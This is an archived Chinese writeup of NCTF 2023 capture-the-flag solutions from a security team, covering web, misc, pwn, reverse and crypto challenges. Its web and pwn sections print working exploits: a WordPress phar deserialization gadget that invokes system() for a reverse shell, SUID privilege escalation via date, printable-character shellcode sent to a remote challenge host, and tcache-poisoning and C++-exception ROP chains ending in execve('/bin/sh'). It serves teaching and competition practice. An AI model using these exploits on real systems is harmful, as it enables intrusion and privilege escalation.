# NCTF 2023 Writeup 完整题解归档

> 关键词:NCTF2023,Writeup,题解,CTF,星盟安全团队,Polaris战队,Web,Misc,Pwn,Reverse,Crypto,正则绕过,phar反序列化,LSB隐写,PowerShell混淆,可见字符shellcode,tcache-hijack,C++异常,z3,Frida,NTRU
> 来源:星盟安全团队博客 `https://blog.xmcve.com/2023/12/28/NCTF2023-Writeup/`(2023-12-28)
> 赛事:NCTF 2023,南京邮电大学主办;Polaris 战队排名第 2(总分 8938),冠军 LaoGong(10605)。

## 赛事信息与解题导览

NCTF(南京邮电大学 CTF)为解题制 Jeopardy 赛制,覆盖 Web / Misc / Pwn / Reverse / Crypto 五方向。本文按方向归档全部题目思路,并在文末标注可提炼的通用技巧(详见本模块各 `CTF-*技巧.md` 文件)。

| 方向 | 题目 | 核心考点 | 提炼文档 |
| --- | --- | --- | --- |
| Web | Wait What? | JS 正则 `g` 标志状态绕过黑名单 | CTF-Web技巧.md |
| Web | ez_wordpress | WordPress 反序列化 + 插件漏洞链 + phar + SUID 提权 | CTF-Web技巧.md |
| Web | logging / Webshell Generator | 日志(未展开)/ WebShell 生成 | CTF-Web技巧.md |
| Misc | Jump For Signin | 动态二维码截图 | CTF-Misc技巧.md |
| Misc | NCTF2077: jackpot | eml 邮件解析、LSB 隐写、PowerShell 混淆免杀分析 | CTF-Misc技巧.md |
| Misc | Jump For Flag | Unity 游戏逆向 + 坐标还原二维码 | CTF-Misc技巧.md |
| Pwn | checkin | 沙箱可见字符 shellcode(alpha3) | CTF-Pwn技巧.md |
| Pwn | npointment | 堆溢出 + tcache-hijack + 任意地址读写 | CTF-Pwn技巧.md |
| Pwn | nception | C++ 异常处理 + 栈溢出 + 任意地址读写 | CTF-Pwn技巧.md |
| Reverse | 中文编程1 | z3 解线性方程组 | CTF-逆向技巧.md |
| Reverse | 中文编程2 | UPX 修复 + 魔改 DES/RC4 算法还原 | CTF-逆向技巧.md |
| Reverse | Jvav | Java 字符串混淆 + 自定义 emoji 编码 + z3 | CTF-逆向技巧.md |
| Reverse | ezVM | VM 类题 + Frida hook 测信道爆破 | CTF-逆向技巧.md |
| Crypto | Signin | NTRU 格密码系统解密 | CTF-密码技巧.md |

---

## WEB 方向

### 1. logging

(原 Writeup 未展开详细说明;考点为日志相关,涉及日志注入/日志分析,思路见后续赛题。)

### 2. Wait What?(JS 正则黑名单绕过)

**考点**:JavaScript 正则表达式 `g` 全局标志下 `test()` 方法的 `lastIndex` 状态导致的真假交替;通过构造报错阻止正则对象更新。

**题目逻辑**:服务端用正则黑名单过滤输入,`ban_user` 接口可把用户加入黑名单,之后用 admin 身份请求 flag。

**关键思路**:
1. 在 `g` 全局模式下,重复调用 `test()` 进行匹配会出现真假交替(lastIndex 不断推进,匹配失败时重置)。
2. 若能触发两次 `test()` 调用即可绕过黑名单。
3. 更新正则对象的部分位于 `try_catch` 中,所以**如果报错就能阻止正则对象的更新**。
4. 对象不能像数组那样被遍历取值,因此用对象来触发报错。

**利用方式**:向 `/api/ban_user` 接口传入

```json
{"username":"user","password":"user","ban_username":{"a":"b"}}
```

再两次用 admin 身份请求 flag,第二次即可获得 flag。

**原理延伸**:JavaScript 正则 `g` 标志下 `lastIndex` 属性是持久化的,`test()`/`exec()` 从上一次匹配结束位置继续;匹配失败时 `lastIndex` 被重置为 0。攻击者可利用该状态机特性使同一正则在不同调用下给出不同结果,配合异常路径(阻止正则重建)实现绕过。参考:知乎《JS 正则的 lastIndex 陷阱》。

### 3. ez_wordpress(WordPress 反序列化 + 插件链 + SUID 提权)

**考点**:WordPress 6.4.1 反序列化漏洞、插件任意文件读取(CVE)、phar 反序列化触发、SUID 提权。综合性较高。

**题目提示**:给出 WordPress 版本为 6.4.1,而官网最新为 6.4.2 —— 版本差异即漏洞点,对比两版源码定位修复内容。

**漏洞链条**:
1. **版本对比**:6.4.2 修复了两个反序列化点,模式一致,恰好是 `call_user_func` 调用,找到反序列化利用链。
2. **插件发现**:从 hint 链接中的插件扫描记录发现 `all-in-one-video-gallery` 插件。
3. **任意文件读取**:该插件存在任意文件读取 CVE,操控 `dl` 参数实现,用于找到 phar 触发点。
4. **上传点**:`drag-and-drop-multiple-file-upload-contact-form-7` 插件提供上传功能(参考 Exploit-DB 48520)。
5. **构造 phar 触发反序列化**:上传恶意 phar 文件,再用任意文件读取(`phar://` 协议)触发反序列化,执行 `system` 反弹 shell。

**phar 构造核心代码**:

```php
<?php
class WP_HTML_Token
{
  public $on_destroy;
  public $bookmark_name;
  public function __construct()
  {
    $this->on_destroy = "system";
    $this->bookmark_name = "反弹shell";
  }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); // 后缀名必须为 phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 设置 stub
$o = new WP_HTML_Token();
$phar->setMetadata($o); // 将自定义对象存入 manifest,反序列化时触发
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

**利用流程**:
1. 上传构造好的 phar 文件(伪装后缀)。
2. 用 all-in-one-video-gallery 的任意文件读取 + `phar://` 协议触发反序列化。
3. 反弹 shell,发现 flag 但无权限读取 → SUID 提权。
4. `date` 命令存在 SUID 位,利用 `date` 提权(`date -f <(echo /bin/sh)` 类技巧或 `/usr/bin/date -f /etc/passwd` 相关经典提权手法)。

**要点**:`phar://` 协议反序列化不依赖 `unserialize()` 调用,任何能读取 phar 元数据的文件操作函数(如 `file_exists`、`file_get_contents`、`fopen`)都可能触发,是 CTF 与实战中常见的反序列化触发方式。

### 4. Webshell Generator

(原 Writeup 未展开详细说明;考点为 WebShell 生成器,考察生成的 WebShell 免杀/特征规避,相关知识与 05-应急响应/WebShell与后门排查.md 对照学习。)

---

## MISC 方向

### 5. Jump For Signin(动态二维码)

**考点**:动态二维码。题目二维码在"未落地"(完整图案显示)之前是完整的,通过**截图工具及时截图**即可得到完整二维码,扫码获得 flag。

**要点**:涉及动态/分段展示的二维码时,在图案完整瞬间截图比逐帧拼合更高效;进阶场景可考虑用 `zbarimg` 等工具批量识别视频帧。

### 6. NCTF2077: jackpot(eml + LSB + PowerShell 混淆)

**考点**:eml 邮件文件解析、图片 LSB 隐写、PowerShell 混淆/免杀载荷分析、多段密文还原。

**解题流程**:
1. **解析 eml 文件**得到两个附件:一个 png 图片、一个 exe。
2. **exe 部分**:扔到微步在线沙箱分析得到 flag2。
3. **图片部分**:发现用 `Invoke-image`(PowerShell 图片隐写脚本)做了免杀,LSB 提取第四位数据即可。

**LSB 提取脚本(Python/PIL)**:

```python
from PIL import Image

def solve_png(image_path):
    img = Image.open(image_path)
    width, height = img.size
    extract_data = bytearray()
    for y in range(height):
        for x in range(width):
            pixels = img.getpixel((x, y))
            extract_byte = (pixels[1] & 0x0F) | ((pixels[2] & 0x0F) << 4)
            extract_data.append(extract_byte)
    return extract_data

data = solve_png("nctf.png")
with open('1.bin', 'wb') as f:
    f.write(data)
```

得到第一段加密密文(PowerShell 混淆代码,`Invoke-image` 免杀载荷,特征为 `DeflateStream` + `FromBase64String` 解压)。

4. **逆 PowerShell**:对密文做 `[Convert]::FromBase64String` → `DeflateStream` 解压 → 得到第二轮密文(十六进制编码串),按 `< r _ l :` 等字符分割提取数据后转十六进制。

5. **第三层**:`ConvertTo-SecureString -Key (143..112)` 解密,再用 `PSCredential.GetNetworkCredential().Password` 还原口令,得到 flag1。

**通用思路**:PowerShell 混淆载荷的常见解包链:`Base64 → 解压(Deflate/Gzip)→ 字符替换/异或 → SecureString`;分析时逐层解码并保留中间结果;识别关键字 `FromBase64String`、`DeflateStream`、`ConvertTo-SecureString`、`GetNetworkCredential`。免杀载荷常配合隐写(LSB/附加数据)存放。

### 7. Jump For Flag(Unity 游戏逆向还原二维码)

**考点**:dnspy 分析 Unity 程序集 `Assembly-CSharp.dll`,根据坐标数据还原二维码。

**解题流程**:
1. 用 dnspy 分析 `Assembly-CSharp.dll`,找到与二维码相关的类。
2. 发现根据 x、z 坐标构造 31×31 的图像,根据第 4 个值判断黑/白。
3. 用 matplotlib 按坐标画散点图,还原二维码图案,扫码得到 flag。

**绘图脚本**:

```python
import matplotlib.pyplot as plt

x, z, colors = [], [], []
with open('hint.txt', 'r') as f:
    for line in f:
        arr = line.split()
        if len(arr) >= 3:
            x.append(int(arr[0]))
            z.append(int(arr[1]))
            colors.append('black' if int(arr[2]) == 1 else 'white')

plt.scatter(x, z, c=colors, marker='s', s=100)
plt.xlabel('X Coordinate')
plt.ylabel('Y Coordinate')
plt.title('Plot of Coordinates with Black/White Colors')
plt.show()
```

**要点**:Unity 游戏(如 CQR 风格)用坐标+值描述图形时,直接将数据点还原为图像;注意坐标系与颜色判定字段。

---

## PWN 方向

### 8. checkin(沙箱可见字符 shellcode)

**考点**:mmap 可执行内存、字符过滤(仅允许可见 ASCII `0x21~0x7A` 范围)、调用预置 payload、alpha3 生成可见字符 shellcode。

**程序逻辑**:mmap 固定地址 0x20230000 可读可写可执行;读入最多 0x100 字节 shellcode,逐字节校验必须落在可见字符范围(`'0'-'9'`、`'A'-'Z'`、`'a'-'z'`、`'/'`);将栈上 payload 复制到 mmap 区开头,调用 sandbox() 后跳转执行。

**利用思路**:
1. 利用栈上的入口地址进行偏移,设置 rax 为入口地址。
2. 使用 **alpha3** 生成器生成可见字符 shellcode(先发一段可见字符的"引导"载荷,再发送完整可见字符 shellcode)。

**exp 核心(pwntools)**:

```python
from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('8.130.35.16', 58002)
# 第一阶段:可见字符引导,设置寄存器
sh.sendafter(b'shellcode: ', b'jBZPPPf1Tt0XXXXXXX' + b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G122o5L162v1n3Z4s3f173p4I3c1o3c353d1L062G4N06060q05184r4L000n020b0z5L3m2I004r113Y1N8N3R1O3r3Y3b17401N051M8N3n1M4M3k114u8O0E5o0q8M3F0b')
sh.recvuntil(b'0')

# 第二阶段:可见字符 shellcode 实现 open("flag") → read → write
shellcode = asm('''
jmp start
read:
    mov r15, rdx
    xor edx, edx
    inc edx
read_again:
    xor eax, eax
    syscall
    inc rsi
    dec r15
    test r15, r15
    jnz read_again
ret
write:
    mov r15, rdx
    xor edx, edx
    inc edx
write_again:
    xor eax, eax
    inc eax
    syscall
    inc rsi
    dec r15
    test r15, r15
    jnz write_again
ret
start:
    xor edi, edi
    mov eax, 3
    syscall
    mov eax, 0x67616c66 ; // "flag"
    push rax
    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ; // open("flag", O_RDONLY)
    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    call write
    ...
''')
sh.send(shellcode.ljust(0x400, b'\xcc'))
sh.interactive()
```

**要点**:可见字符 shellcode 的约束是仅用可打印 ASCII 表达机器码;生成方式:手写受限汇编 → alpha3/X86_64 shellcode 编码器;也可用 `pwntools` + 编码插件。沙箱类题目(seccomp 白名单)还需注意只允许 open/read/write 等系统调用。

### 9. npointment(堆溢出 + tcache-hijack)

**考点**:堆溢出(`date=date=date` 触发)、tcache poisoning(tcache-hijack)、libc/heap/程序基址/栈地址泄露、one_gadget 或 ROP getshell。

**漏洞点**:函数 14B3 中,输入 `date=date=date` 可造成堆溢出。

**利用流程(核心步骤)**:
1. 布局多个 chunk(add/delete 交错),触发堆溢出改写相邻 chunk 的 size 与 fd。
2. 通过 `show` 泄露 libc 地址(`libc_addr = leak - 0x1ff130`)。
3. 泄露堆地址(利用 tcache 或 unsorted bin 残留指针,`heap_addr = leak * 0x1000` 类恢复)。
4. 利用 **tcache poisoning**(safe-linking:`chunk_ptr = (heap_addr >> 12) ^ fd`)将 tcache 的 fd 指向任意目标,实现任意地址写。
5. 泄露程序 image base、栈地址。
6. 最终将栈上返回地址覆写为 ROP 链(以 `system("/bin/sh")` 或 execve 收尾)。

**exp 片段(tcache safe-linking 覆盖)**:

```python
# 覆盖 tcache fd 实现任意地址写(异或保护)
sh.sendlineafter(b'$ ', b'add content=' + b'a' * 0x20 + p64((heap_addr >> 12) ^ (libc_addr + 0x247320)))
# 泄露栈地址后,覆写返回地址为 ROP 链
sh.sendlineafter(b'$ ', (b'add content=' + b'a' * 8 + p64(libc_addr + 0x0000000000026a3d)).ljust(0x100, b'\0') + flat([
    libc_addr + 0x0000000000028715,
    libc_addr + 0x1c041b,
    libc_addr + 0x000000000002a671,
    0,
    libc_addr + 0x0000000000093359,
    0, 0,
    libc_addr + 0x0000000000046663,
    59,
    libc_addr + 0x00000000000942b6,
]))
```

**要点**(详见 CTF-Pwn技巧.md):
- tcache 在 glibc 2.32+ 引入 **safe-linking**:fd 存储为 `(address >> 12) ^ real_ptr`,覆盖时需要按此异或。
- 泄露顺序通常为:libc → heap → 程序基址 → 栈;每泄露一个地址为下一步定位偏移服务。
- 堆题通用的 add/delete 布局思想:先制造 UAF/溢出,再通过 double-free 或 tcache poisoning 定向写。

### 10. nception(C++ 异常处理 + 任意地址读写)

**考点**:`edit` 栈溢出控制异常处理流程、C++ 异常 `catch` 块对 `rbp` 内存的写操作、任意地址读写、canary 泄露。

**漏洞点**:`edit` 存在栈溢出,可控制异常处理,进而控制 `rbp` 的值。在 `catch` 块中地址 `0x402E2C` 会对 `rbp` 指向的内存有写操作(`mov [rbp+0xe], rax`),因此可以修改指针的低位,使其落于可控位置,实现**任意地址读写**。

**关键反汇编**:

```asm
; catch(std::exception) // owned by 402DC0
.text:0000000000402E16  cmp     rdx, 1
.text:0000000000402E1A  jz      short loc_402E24
.text:0000000000402E1C  mov     rdi, rax
.text:0000000000402E1F  call    __Unwind_Resume
.text:0000000000402E24  mov     rdi, rax
.text:0000000000402E27  call    ___cxa_begin_catch
.text:0000000000402E2C  mov     [rbp+0xe], rax   ; 对 rbp 指向内存写 rax
```

**利用流程**:
1. 通过 `edit` 溢出控制 `rbp`,使 `rbp+0xe` 落在可控内存(如某全局指针附近),把指针改到可控 buffer。
2. 构造任意地址读写原语:写入目标地址到指针区,`show` 读出内容(泄露 libc、栈地址)。
3. 扫描栈内存,定位返回地址位置与 canary(通过对比 `libc_addr + 0x27200` 特征)。
4. 最终溢出时带上 canary,覆写返回地址为 ROP 链(execve("/bin/sh"))。

**exp 核心**:

```python
# 将某指针覆写为任意地址,show 实现任意读
edit(0, 0x130, p64(0x405FC8))            # 目标指针
edit(0, 0x130+8, p32(0x444))
edit(0, 0, cyclic(544) + p64(0x406429+0x18)[:6])
show(6)
libc_addr = u64(sh.recvn(6) + b'\0\0') - 0xf87d0   # 泄露 libc

# 扫描栈找 canary 与返回地址
for i in range(0x18):
    edit(0, 0x130, p64(stack_addr + 0x11 + i * 8))
    ...
# 最终 ROP
edit(0, 0, b'\0' * 0x10 + cyclic(504) + p64(canary) + flat([...rop...]))
```

**要点**:C++ 异常机制(`__cxa_begin_catch`/`__Unwind_Resume`/`catch` 块)常引入额外的内存写点,栈溢出时可借"写原语"把失控指针校准到可控区域,将任意写转化为任意地址读写。

---

## REVERSE 方向

### 11. 中文编程1(z3 解线性方程组)

**考点**:IDA 反编译出 11 元线性方程组,用 z3 求解。

**思路**:程序对 11 个输入字符做线性加权求和并与若干大数比较,直接用 z3 `Solver` 添加约束求解,得到每个字符的字节值。

**exp 核心(z3)**:

```python
from z3 import *
s = Solver()
v20 = [Int(f'inp{i}') for i in range(11)]

# 逐条添加方程,如:
s.add(v20[0]*52.0 + v20[1]*93.0 + ... - 7.86241466532e11 == 0)
# ...

if s.check() == sat:
    m = s.model()
    for i in v20:
        print(hex(m[i].as_long()), end=',')
```

**要点**:反编译结果中出现大量浮点系数与大数比较时,优先考虑 z3 约束求解;注意将浮点系数转为精确整数比较,必要时用 `Real` 类型。

### 12. 中文编程2(UPX 修复 + 魔改 DES/RC4)

**考点**:节区名被篡改导致 UPX 无法解包(把节区名改回去即可 UPX 解包)、搜索字符串定位加密流程、魔改加密算法还原(DES 部分不完整,手动还原算法后写逆)。

**解题流程**:
1. **UPX 修复**:程序节区名被改,`upx -d` 失败;把节区名改回 `UPX0/UPX1` 等后即可解包。
2. 解包后搜索字符串,定位到加密函数。
3. 加密流程大致为 **RC4 + DES + RC4**;DES 部分被魔改(不完整),根据逻辑手动还原算法,写出解密程序。
4. 解密得到 flag。

**exp 要点**:还原魔改 DES 时,保留 S-box 与置换表,把加密轮改为解密轮(`des_crypt_ecb_dec`),逐块 ECB 解密后再异或 RC4 流。魔改算法还原的通用方法:
- 对比标准实现(如 mbedTLS DES 源码),找出差异(缺失轮、交换 SK 顺序、改 S-box)。
- 用已知明文-密文对验证还原的正确性。

### 13. Jvav(Java 字符串混淆 + emoji 编码 + z3)

**考点**:Java 程序字符串混淆(多个 `String Decryptor` 函数)、自定义 emoji 编码表(6-bit 分组)、z3 逆向求解、填充与密钥混淆。

**程序逻辑**:
- 输入 `flag{...}` 中间 36 字节,先与 `51` 逐字节异或。
- 调用 `ALLATORIxDEMO(byte[])` 编码:补位到 24 的倍数(第一个字节写填充长度,末尾填充 `"NCTF2023"` 循环字节),再按 6-bit 分组映射到 64 个 emoji 字符表。
- 与密文(一串 emoji)比较。

**利用流程**:
1. 将 emoji 密文映射回索引序列(与 64 元素表比对,注意 `☹️` 是变体选择符序列,需处理)。
2. 用 z3 对编码过程建模(位流拼接),添加密文约束与已知尾部 `NCTF2023...` 约束,求解出原始字节。
3. 与 51 异或还原,去掉填充,得到 `flag{...}`。

**exp 核心**:

```python
# 编码建模(z3):v3 |= (inp[i] & 0xFF) << (8 - v4); v4 += 8;
# while v4 >= 6: v5 = v3 >> 10 & 0x3f; v4 -= 6;
#   输出 (v5 >> 4 | v5 << 2) & 0x3F; v3 <<= 6
# 附加已知约束 inp[37:48] == "NCTF2023NCTF"
s = Solver()
for i in range(len(x)):
    s.add(x[i] == enc[i])
# 求解后异或 51 还原
```

**要点**:自定义 base64 类编码(任意字母表 + 位分组)是 CTF 常见混淆;思路是**先还原编码表与分组逻辑,再用 z3/脚本逆推**;遇到 emoji 等多字节字符注意按码点/代理对处理。

### 14. ezVM(VM 类题目 + Frida 测信道爆破)

**考点**:VM(虚拟机)保护类逆向,单字符加密;利用 **Frida hook** 在配置 opcode 处统计执行次数,通过**测信道(执行次数最多即正确字符)**逐位爆破 flag。

**解题流程**:
1. 分析 VM 类:识别 opcode 解析、字符串输出逻辑与加密点。
2. 发现是**单字符加密**(每个输入字符独立处理)。
3. 用 Frida 在配置 opcode 的地方 hook,统计程序对每个输入字符的执行次数。
4. **当输入正确字符时,该处位置运行次数最多**。
5. 逐位爆破 0x20~0x7E,运行约两小时出 flag。

**要点**:VM 题通用思路:
- 先摸清指令集(opcode → 操作),再分析数据流;
- 单字符加密 + 可观察副作用(执行次数/时间/功耗)时可测信道爆破;
- Frida 动态插桩比纯静态分析高效,尤其对执行次数型侧信道。

---

## CRYPTO 方向

### 15. Signin(NTRU 格密码解密)

**考点**:标准 NTRU 公钥密码系统解密。题目实现标准 NTRU,所有参数已给出,按解密流程实现即可。

**NTRU 参数**:`N=509, p=3, q=512, d=3`;公开多项式 `hx`(公钥)、`fx`(私钥)、密文 `e`。

**解密流程(Sage)**:
1. 计算 `a = (f * e) mod (x^N - 1)`,系数按 q 对称化(> 256 减 512)。
2. 在模 p 多项式环中求 `Fp = f^{-1} mod (x^N - 1)`。
3. `m = (Fp * a) mod (x^N - 1)`,系数即 0/1 位。
4. 每 8 位一组转字符得到 flag。

**exp 核心(Sage)**:

```python
N, p, q = 509, 3, 512
Rq.<x> = PolynomialRing(Zmod(q))
f = Rq(fx)
c = Rq(e)
Modq = x^N - 1
a = (f * c) % Modq
A = [int(i) for i in a]
for i in range(len(A)):
    if A[i] > 256:
        A[i] -= 512

Rp.<x> = PolynomialRing(Zmod(p))
f = Rp(fx)
Mod = x^N - 1
Fp = inverse_mod(f, Mod)   # 模 p 多项式求逆
b = sum(A[i] * x^i for i in range(len(A)))
m = (Fp * b) % Mod

flag = ''.join(chr(int(''.join(str(i) for i in m[j*8:(j+1)*8]), 2)) for j in range(42))
print(flag)   # NCTF{0e301384-a06c-11ee-959d-b39f60b9e252}
```

**要点**:NTRU 的安全性基于格;解密需要私钥 f,在多项式环中做乘法并利用系数范围恢复明文。CTF 中格密码题常用 SageMath 求解,涉及 `PolynomialRing(Zmod(q))`、`inverse_mod`、模 `x^N - 1` 环运算。相关理论见 08-密码学与身份认证/密码学基础.md。

---

## 提炼索引

| 通用技巧 | 详见文档 |
| --- | --- |
| JS 正则 `g` 标志 lastIndex 状态绕过 | CTF-Web技巧.md |
| phar 反序列化构造与触发 | CTF-Web技巧.md |
| WordPress 插件漏洞链思路(版本对比/插件扫描/CVE 检索) | CTF-Web技巧.md |
| SUID 提权 | CTF-Web技巧.md |
| LSB 隐写提取 | CTF-Misc技巧.md |
| eml 邮件附件解析 | CTF-Misc技巧.md |
| PowerShell 混淆载荷逐层解包 | CTF-Misc技巧.md |
| 坐标还原二维码 / 动态二维码截图 | CTF-Misc技巧.md |
| 可见字符 shellcode(alpha3) | CTF-Pwn技巧.md |
| tcache-hijack / safe-linking / 堆地址泄露链 | CTF-Pwn技巧.md |
| C++ 异常处理写原语转任意地址读写 | CTF-Pwn技巧.md |
| z3 约束求解方程组 | CTF-逆向技巧.md |
| UPX 壳修复(节区名) | CTF-逆向技巧.md |
| 魔改加密算法还原(DES/RC4) | CTF-逆向技巧.md |
| Frida 测信道爆破 VM 题 | CTF-逆向技巧.md |
| Java 字符串混淆与自定义编码还原 | CTF-逆向技巧.md |
| NTRU 格密码解密 | CTF-密码技巧.md |
